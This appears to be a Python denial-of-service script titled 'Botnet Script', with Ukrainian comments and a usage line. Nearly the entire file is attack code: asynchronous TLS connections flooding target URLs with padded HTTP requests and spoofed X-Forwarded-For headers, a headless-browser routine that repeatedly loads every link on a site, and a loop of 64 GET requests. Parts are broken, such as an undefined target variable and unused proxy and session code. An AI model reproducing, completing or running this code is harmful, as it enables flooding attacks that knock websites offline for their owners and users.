import os
import sys
import subprocess
import platform
from concurrent.futures.thread import ThreadPoolExecutor
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
import time
import random
import string
import re
import asyncio
import urllib.parse
import ssl
import ipaddress
import aiohttp
import requests
from bs4 import BeautifulSoup

# Зазначте вагу пакетів у мегабайтах
min_desired_bandwidth_mbps = 100  # Мінімальна вага пакета
max_desired_bandwidth_mbps = 500  # Максимальна вага пакета

method = ["POST ", "GET ", "PUT ", "DELETE ", "PATCH ", "OPTIONS "]
useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
]

pps, cps = 0, 0

global_channels = []

# Визначення операційної системи
system_platform = platform.system()

# Завантаження та встановлення ChromeDriver для Linux або Windows
chrome_driver_url = ""
if system_platform == "Linux":
    chrome_driver_url = "https://chromedriver.storage.googleapis.com/94.0.4606.61/chromedriver_linux64.zip"
elif system_platform == "Windows":
    chrome_driver_url = "https://chromedriver.storage.googleapis.com/94.0.4606.61/chromedriver_win32.zip"
elif system_platform == "Darwin":
    chrome_driver_url = "https://chromedriver.storage.googleapis.com/94.0.4606.61/chromedriver_mac64.zip"
else:
    print("Unsupported platform. Please manually download and configure ChromeDriver.")
    sys.exit(1)

# Завантаження та розпакування ChromeDriver
chrome_driver_filename = "chromedriver.zip"
chrome_driver_path = os.path.join(os.getcwd(), "chromedriver")
if not os.path.exists(chrome_driver_path):
    print(f"Downloading ChromeDriver from {chrome_driver_url}...")
    response = requests.get(chrome_driver_url)
    with open(chrome_driver_filename, "wb") as f:
        f.write(response.content)
    print("ChromeDriver downloaded successfully.")

    print("Unzipping ChromeDriver...")
    subprocess.check_call(["unzip", "-o", chrome_driver_filename])
    os.chmod(chrome_driver_path, 0o775)
    print("ChromeDriver unzipped successfully.")
else:
    print("ChromeDriver already exists.")

# Налаштування Chrome WebDriver
chromeOptions = Options()
chromeOptions.add_argument('--headless')  # Use add_argument to set headless mode
executor = ThreadPoolExecutor(20)

cache = {}

def generate_random_string(length):
    letters = string.ascii_lowercase
    rand_string = ''.join(random.choice(letters) for i in range(length))
    return rand_string

def getlinks(url):
    driver = webdriver.Chrome(chrome_driver_path, options=chromeOptions)
    links = []
    driver.get(url)
    a_tags = driver.find_elements_by_xpath('.//a')
    for a_tag in a_tags:
        link = a_tag.get_attribute("href")
        links.append(link)
    driver.quit()
    return links

def scrape(base_url):
    urls = getlinks(base_url)
    for url in urls * 10:
        executor.submit(scraper, url)

def scraper(url):
    driver = webdriver.Chrome(chrome_driver_path, options=chromeOptions)
    driver.get(url)
    time.sleep(15)
    driver.quit()

def generate_bot_ip():
    return str(ipaddress.IPv4Address(random.randint(0, 2**32)))

def generate_bot_request(url, payload_size_kb):
    if (url, payload_size_kb) in cache:
        return cache[(url, payload_size_kb)]

    bot_ip = generate_bot_ip()
    payload_size_bytes = int(payload_size_kb * 2048)
    payload = "A" * payload_size_bytes
    request = (
        f"{random.choice(method)}{url.path or '/'} HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        f"X-Forwarded-For: {bot_ip}\r\n"
        f"User-Agent: {random.choice(useragents)}\r\n"
        f"Content-Length: {payload_size_bytes}\r\n"
        f"\r\n"
        f"{payload}\r\n"
    ).encode('latin-1')

    cache[(url, payload_size_kb)] = request
    return request

async def bot_connect(url, rpc, request_interval, channel_index, use_proxy=False):
    global cps, pps
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.options |= ssl.OP_NO_SSLv2
    context.options |= ssl.OP_NO_SSLv3
    reader, writer = await asyncio.open_connection(url.hostname, url.port or 443, ssl=context)
    cps += 1

    global_channels.append(channel_index)

    for _ in range(rpc):
        request_payload = generate_bot_request(url, random.uniform(1, 10))
        writer.write(request_payload)
        await writer.drain()
        pps += 1
        await asyncio.sleep(request_interval)

    global_channels.remove(channel_index)

async def botnet_main():
    site_urls = sys.argv[1].split() if len(sys.argv) > 1 else ["https://example.com"]
    num_bots = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    rpc = int(sys.argv[3]) if len(sys.argv) > 3 else 1

    min_request_interval = 1 / max_desired_bandwidth_mbps
    max_request_interval = 1 / min_desired_bandwidth_mbps

    random.seed()

    connector = aiohttp.TCPConnector(limit_per_host=num_bots * 2)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for site_url in site_urls:
            url = urllib.parse.urlsplit(site_url)
            for i in range(num_bots):
                request_interval = random.uniform(min_request_interval, max_request_interval)
                use_proxy = random.choice([True, False])
                tasks.append(bot_connect(url, rpc, request_interval, i, use_proxy))
        await asyncio.gather(*tasks)

    if len(global_channels) < num_bots:
        print("One or more channels were disconnected.")

# JavaScript user agents
js_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
]

# Python user agents
python_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    # Add three more Python user agents here
]

useragents = python_user_agents

# JavaScript code converted to Python
def start_flood():
    for _ in range(64):
        s = requests.Session()
        headers = {
            "user-agent": random.choice(js_user_agents),
            "Upgrade-Insecure-Requests": "1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "Keep-Alive",
        }
        s.get(target, headers=headers)

if __name__ == "__main__":
    print("Welcome to the Botnet Script")
    print("Author: @zemondza")
    print("usage python3 botnetv3.py https://example.com 5 10")
    print("----------------------------")
    asyncio.run(botnet_main())
